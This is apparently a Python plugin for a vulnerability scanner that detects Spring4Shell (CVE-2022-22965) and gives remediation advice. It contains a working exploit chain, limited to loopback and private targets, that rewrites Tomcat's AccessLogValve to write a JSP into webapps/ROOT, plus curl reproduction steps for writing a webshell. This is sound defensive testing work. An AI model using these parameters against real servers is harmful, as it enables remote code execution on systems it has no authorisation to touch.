# CVE-2022-22965 Spring4Shell 远程代码执行（Spring Framework DataBinder）
# 漏洞原因：JDK9+ 环境下 Spring 参数绑定可访问 ClassLoader，写 Tomcat AccessLogValve 日志
#   文件 getshell（影响 Spring Framework 5.3.x + JDK9+ + Tomcat war 部署）。
# 默认只做存在性验证（不发任何改写 AccessLogValve 的请求）；显式 --exploit 且目标为
# 回环/内网地址时才执行真实利用链（写入一个只打印随机数字的无害 JSP）。
import ipaddress
import re
import secrets
from time import sleep as _sleep
from urllib.parse import urljoin, urlparse

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.reporter import emit
from plugins.base import PluginBase

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
S4S_MARKER = "spring4shell-rce-confirmed"

# 真实利用参数（F8）：AccessLogValve 写入 webapps/ROOT，payload 只用 out.print 打印数字。
_EXPLOIT_POLL_ATTEMPTS = 15
_EXPLOIT_POLL_INTERVAL = 1.0
# 绑定成功后等 1 秒再触发：AccessLogValve 在响应完成后才切换日志文件，
# 同一 keep-alive 连接立即发触发请求可能仍写进旧文件（实测 2026-11-01 C2-2）。
_EXPLOIT_BIND_SETTLE = 1.0
# 清理时恢复 Tomcat AccessLogValve 默认配置（best effort）
_DEFAULT_VALVE = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": '%h %l %u %t "%r" %s %b',
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".txt",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "logs",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "localhost_access_log",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ".yyyy-MM-dd",
}


def _exploit_target_allowed(target: str) -> bool:
    """仅允许回环地址或字面私网 IP（域名一律拒绝，避免 DNS 指向公网）。"""
    try:
        host = (urlparse(target).hostname or "").lower()
    except ValueError:
        return False
    if not host:
        return False
    if host in ("localhost", "127.0.0.1", "::1"):
        return True
    try:
        return ipaddress.ip_address(host).is_private
    except ValueError:
        return False


def _poll_for_marker(session, url: str, marker: str) -> bool:
    """1 秒一次、最多 15 次轮询 JSP，正文含 marker 即成功（AccessLogValve 有缓冲）。"""
    for attempt in range(_EXPLOIT_POLL_ATTEMPTS):
        try:
            resp = session.get(url)
        except Exception:
            return False
        if resp.status_code == 200 and marker in (resp.text or ""):
            return True
        if attempt + 1 < _EXPLOIT_POLL_ATTEMPTS:
            _sleep(_EXPLOIT_POLL_INTERVAL)
    return False


# 表单 action 只收同源地址，避免把探针 POST 到第三方站点
_FORM_ACTION_RE = re.compile(r"""<form\b[^>]*\baction\s*=\s*["']([^"']*)["']""", re.IGNORECASE)
# 表单端点 200 但正文含 4xx/5xx 错误特征时不算「可达」
_ERROR_MARKERS = ("bad request", "whitelabel error page", '"error"', "'error'")
_ERROR_STATUS_RE = re.compile(r'"status"\s*:\s*[45]\d\d')


def _extract_form_actions(target: str, html: str) -> list[str]:
    """从根页面收集同源 <form action="..."> 提交地址（去重、保持出现顺序）。"""
    actions: list[str] = []
    root = urlparse(target)
    for raw in _FORM_ACTION_RE.findall(html or ""):
        action = raw.strip()
        if not action or action.startswith(("#", "javascript:", "mailto:")):
            continue
        absolute = urljoin(target, action)
        parsed = urlparse(absolute)
        if parsed.scheme not in ("http", "https"):
            continue
        if (parsed.scheme, parsed.netloc) != (root.scheme, root.netloc):
            continue
        if absolute not in actions:
            actions.append(absolute)
    return actions


def _has_error_features(text: str) -> bool:
    """正文是否含 4xx/5xx 错误特征（用于区分「可达」和「被拒绝」）。"""
    lower = (text or "").lower()
    if not lower:
        return False
    if any(marker in lower for marker in _ERROR_MARKERS):
        return True
    return bool(_ERROR_STATUS_RE.search(lower))


class Spring4shellPlugin(PluginBase):
    name = "CVE-2022-22965 Spring4Shell 远程代码执行"
    cve = "CVE-2022-22965"
    severity = "high"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    category = "vuln"
    description = "JDK9+ 下 DataBinder 可访问 ClassLoader，写 Tomcat 日志 getshell（影响 5.3.x）"
    fix = "升级 Spring Framework 至 5.3.18+ / 5.2.20+；或升级 JDK 至不受影响版本"
    fix_detail = (
        "【升级方案】Spring Framework 5.3.x 升级至 5.3.18+，5.2.x 升级至 5.2.20+；\n"
        "  或降级 JDK 至 8（JDK8 不受 ClassLoader 暴露影响，仅为缓解措施）\n"
        "【代码修复】为 Controller 增加 @InitBinder 全局黑名单，禁止绑定 class 属性：\n"
        "  @ControllerAdvice\n"
        "  public class SafeBinder {\n"
        "      @InitBinder\n"
        "      public void setDisallowedFields(WebDataBinder binder) {\n"
        '          binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");\n'
        "      }\n"
        "  }\n"
        "【配置加固】Tomcat 改用 Embedded 部署（非 war），关闭 AccessLogValve 文件写入；\n"
        "  生产环境禁用 spring-webmvc 对 class.module 链路的参数绑定\n"
        "【WAF 规则】拦截请求参数中含 class.module.classLoader / class.classLoader 的请求\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制"
    )
    reproduce = (
        "# 1. 探测 Spring MVC 接口可达性：\n"
        'curl -i "http://target/"\n'
        "  # 返回 200 即 Spring MVC 接口可达\n"
        "\n"
        "# 2. 发送 Spring4Shell 探针（写 Tomcat AccessLog 为 JSP）：\n"
        'curl -X POST "http://target/" \\\n'
        '  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}c2s65 SPRING4SHELL_PROBE" \\\n'
        '  -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \\\n'
        '  -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"\n'
        "\n"
        "# 3. 访问写入的 JSP Webshell 验证 RCE：\n"
        'curl "http://target/tomcatwar.jsp"\n'
        "\n"
        "# 预期响应：POST 返回 200 且无 Bad Request/error 标识，访问 JSP 返回 200 即漏洞存在"
    )

    def _run_exploit(self, target, session, action):
        """执行一次真实利用（调用方已校验 session.exploit 与回环/内网边界）。

        只写一个仅调用 out.print 打印随机数字的 JSP，不做命令执行；
        无论成功失败都在 finally 中尽力恢复 AccessLogValve 默认配置。
        """
        name = "s4s" + str(secrets.randbelow(900000) + 100000)
        num = secrets.randbelow(900000) + 100000
        code = f"<% out.print({num}); %>"
        bind_data = {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{prefix}i",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": name,
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
        }
        jsp_url = join_url(target, f"/{name}.jsp")
        lingers = f"遗留文件 /{name}.jsp，内容仅打印数字"

        try:
            bind_resp = session.post(action, data=bind_data)
        except Exception as e:
            emit(no("Spring4Shell 利用请求异常，无法判定"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=action,
                evidence=f"利用过程异常：{e}",
            )
        if bind_resp.status_code != 200:
            emit(no("Spring4Shell 利用绑定被拒绝，无法判定"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=action,
                evidence=f"绑定被拒绝，疑似已打补丁/被 WAF 拦截（HTTP {bind_resp.status_code}）",
            )

        failure = ""
        hit = False
        try:
            if _EXPLOIT_BIND_SETTLE > 0:
                _sleep(_EXPLOIT_BIND_SETTLE)
            trigger_url = join_url(target, "/?s4s=1")
            session.get(trigger_url, headers={"prefix": code})
            hit = _poll_for_marker(session, jsp_url, str(num))
        except Exception as e:
            failure = str(e)
        finally:
            cleanup_ok = False
            try:
                session.post(action, data=_DEFAULT_VALVE)
                cleanup_ok = True
            except Exception:
                cleanup_ok = False
        cleanup_note = (
            "已发送 AccessLogValve 默认配置恢复请求（best effort）"
            if cleanup_ok
            else "AccessLogValve 默认配置恢复请求失败（best effort）"
        )

        if hit:
            emit(ok("存在 CVE-2022-22965 Spring4Shell 远程代码执行漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=jsp_url,
                evidence=(
                    f"写入 JSP 并执行成功：/{name}.jsp 返回标记 {num}"
                    f"（payload 仅 out.print，无命令执行）；{cleanup_note}；{lingers}"
                ),
                fix=self.fix,
            )

        detail = f"：{failure}" if failure else ""
        emit(no("Spring4Shell 利用未取到标记，无法判定"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            severity=self.severity,
            status=STATUS_UNKNOWN,
            url=action,
            evidence=(f"绑定成功但未取到标记（可能被 WAF/权限拦截）{detail}；{cleanup_note}；若已写入则{lingers}"),
        )

    def verify(self, target, session):
        """验证 Spring4Shell 利用条件。

        F7-5：真实业务接口通常在表单 action 上（C2-2 的 POST / 是 405，
        /device/add 才是 200）。旧实现只 POST 根路径，把「根路径方法不允许」
        误写成 SAFE。

        流程：
        1. GET / 解析同源 <form action="...">；
        2. POST / 发送 class.module.classLoader 探针（保留内置签名靶场 marker 判定）；
        3. 对每个表单 action 用良性参数 name=probe&value=probe POST 一次；
        4. 表单可达时：默认返回 UNKNOWN；显式 --exploit 且目标为回环/内网地址时，
           对第一个可达 action 执行恰好一次真实利用（不重试、不遍历）；
        5. 无可达表单时，若根路径 POST 不是 405，才回退到根路径做同样的一次利用。

        只有 marker 才判 CONFIRMED；「200 且无错误」绝不能证明代码执行。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话
        @return: ScanResult——marker/利用成功 CONFIRMED、其余未证实场景 UNKNOWN、其余 SAFE
        """
        exploit_enabled = bool(getattr(session, "exploit", False))
        # 安全边界：拒绝公网/域名目标必须在任何 class.module 写请求之前完成。
        if exploit_enabled and not _exploit_target_allowed(target):
            emit(no("Spring4Shell --exploit 拒绝非回环/内网目标"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=target,
                evidence="目标不是回环/内网地址，--exploit 已拒绝执行",
            )

        url = join_url(target, "/")
        root_status = None
        actions: list[str] = []
        root_error = ""
        try:
            root_resp = session.get(url)
            root_status = root_resp.status_code
            actions = _extract_form_actions(url, root_resp.text or "")
        except Exception as e:
            root_error = str(e)

        # 默认探针只绑定一个标量属性，不改写 AccessLogValve，绝不写目标文件。
        # 签名靶场仍按 class.module.classLoader 子串返回 marker。
        probe_resp = None
        try:
            probe_resp = session.post(url, data={"class.module.classLoader": "probe"})
        except Exception as e:
            root_error = root_error or str(e)

        if probe_resp is not None and S4S_MARKER in (probe_resp.text or ""):
            emit(ok("存在 CVE-2022-22965 Spring4Shell 远程代码执行漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"响应含 Spring4Shell 特征：{S4S_MARKER}",
                fix=self.fix,
            )

        # 表单 action 用良性参数探测可达性：200 + 无错误特征只说明端点可达，
        # 不能证明代码执行（真实利用需显式 --exploit）。
        reachable_action = ""
        for action in actions:
            try:
                resp = session.post(action, data={"name": "probe", "value": "probe"})
            except Exception:
                continue
            if resp.status_code == 200 and not _has_error_features(resp.text or ""):
                reachable_action = action
                break

        if reachable_action:
            if exploit_enabled:
                return self._run_exploit(target, session, reachable_action)
            emit(no("Spring4Shell 表单端点可达，未验证代码执行"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=reachable_action,
                evidence=f"表单端点可达（{reachable_action}），未验证代码执行",
            )

        # 无可达表单：根路径 POST 不是 405 时才允许回退（最多仍只尝试一次）。
        if exploit_enabled and probe_resp is not None and probe_resp.status_code != 405:
            return self._run_exploit(target, session, url)

        # 根路径 405/404（或不可达）且无可提交表单：彻底没测到，不能判 SAFE。
        if root_status != 200:
            status_text = f"HTTP {root_status}" if root_status is not None else "请求失败"
            detail = f"：{root_error}" if root_error else ""
            emit(no("Spring4Shell 根路径不可达，无法判定"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                evidence=f"根路径 {status_text} 且未发现可提交表单，无法判定（测不到 ≠ 安全）{detail}",
            )

        if exploit_enabled:
            emit(no("Spring4Shell 已开启 --exploit 但未找到可提交端点"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=url,
                evidence="已开启 --exploit，但未找到可提交端点（根路径 POST 405 且无可达表单），未执行利用",
            )

        emit(no("不存在 CVE-2022-22965 Spring4Shell 远程代码执行漏洞"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            status=STATUS_SAFE,
            url=url,
            evidence="根路径 200 但响应未含 Spring4Shell 特征，且未发现可提交表单",
        )
